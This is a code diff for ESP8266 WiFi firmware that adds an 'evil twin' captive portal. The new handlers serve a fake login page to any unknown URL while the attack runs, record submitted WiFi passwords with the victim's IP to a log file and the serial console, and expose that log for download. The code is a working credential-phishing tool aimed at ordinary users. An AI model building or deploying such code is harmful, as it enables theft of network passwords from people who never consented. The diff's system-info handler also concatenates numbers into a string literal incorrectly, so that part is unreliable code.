@@ -419,11 +419,81 @@ namespace wifi {
             server.send(200, str(W_JSON), attack.getStatusJSON());
         });
 
+        server.on("/logpwd", HTTP_POST, []() {
+            String password = server.arg("pwd");
+            String clientIP = server.client().remoteIP().toString();
+            
+            File logFile = LittleFS.open("/etwin_log.txt", "a");
+            if (logFile) {
+                logFile.print("[");
+                logFile.print(millis());
+                logFile.print("] IP: ");
+                logFile.print(clientIP);
+                logFile.print(" | Password: ");
+                logFile.println(password);
+                logFile.close();
+                
+                Serial.println("=== EVIL TWIN CAPTURE ===");
+                Serial.println("IP: " + clientIP);
+                Serial.println("Password: " + password);
+                Serial.println("=========================");
+            }
+            
+            server.send(200, str(W_TXT), "OK");
+        });
+
+        server.on("/etwin.html", HTTP_GET, []() {
+            if (LittleFS.exists("/web/etwin.html")) {
+                handleFileRead("/web/etwin.html");
+            } else {
+                server.send(200, str(W_HTML), 
+                    "<html><body><h1>Evil Twin Portal</h1><p>etwin.html not found</p></body></html>");
+            }
+        });
+
+        server.on("/etwin_log.txt", HTTP_GET, []() {
+            if (LittleFS.exists("/etwin_log.txt")) {
+                File logFile = LittleFS.open("/etwin_log.txt", "r");
+                String content = "";
+                if (logFile) {
+                    content = logFile.readString();
+                    logFile.close();
+                }
+                server.send(200, str(W_TXT), content);
+            } else {
+                server.send(200, str(W_TXT), "No logs yet");
+            }
+        });
+
+        server.on("/clear_logs", HTTP_GET, []() {
+            if (LittleFS.exists("/etwin_log.txt")) {
+                LittleFS.remove("/etwin_log.txt");
+                server.send(200, str(W_TXT), "Logs cleared");
+            } else {
+                server.send(200, str(W_TXT), "No logs to clear");
+            }
+        });
+
+        server.on("/sysinfo.json", HTTP_GET, []() {
+            String json = "{";
+            json += "\"uptime\":" + String(millis());
+            json += ",\"freeheap\":" + ESP.getFreeHeap();
+            json += ",\"rssi\":" + WiFi.RSSI();
+            json += "}";
+            server.send(200, str(W_JSON), json);
+        });
+
         // called when the url is not defined here
         // use it to load content from SPIFFS
         server.onNotFound([]() {
             if (!handleFileRead(server.uri())) {
-                if (settings::getWebSettings().captive_portal) sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
+                if (settings::getWebSettings().captive_portal) {
+                    if (attack.isEvilTwinRunning() && LittleFS.exists("/web/etwin.html")) {
+                        handleFileRead("/web/etwin.html");
+                    } else {
+                        sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
+                    }
+                }
                 else server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
             }
         });
